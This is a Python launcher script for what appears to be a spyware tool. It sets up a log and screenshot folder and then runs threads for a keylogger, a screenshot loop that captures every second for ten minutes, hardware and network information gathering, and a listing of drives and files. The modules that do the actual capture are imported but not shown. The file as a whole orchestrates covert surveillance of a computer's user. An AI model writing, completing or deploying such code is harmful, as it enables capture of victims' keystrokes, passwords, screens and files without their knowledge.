import os
import threading
from config import msg
from generate_terminal_script import generate_terminal_script
from modules import keylogger, screenshot, hardware_info, network_info, file_system

def setup_environment():
    print(msg("setup"))
    os.makedirs("logs/screenshots", exist_ok=True)
    generate_terminal_script()

def run_all():
    print(msg("start"))
    threading.Thread(target=keylogger.start_keylogger, daemon=True).start()
    threading.Thread(target=screenshot.capture_screen_loop, kwargs={"duration":600, "interval":1}).start()
    threading.Thread(target=hardware_info.collect_hardware_info).start()
    threading.Thread(target=network_info.collect_network_info).start()
    threading.Thread(target=file_system.list_drives_and_files).start()

if __name__ == "__main__":
    setup_environment()
    run_all()
    while True:
        pass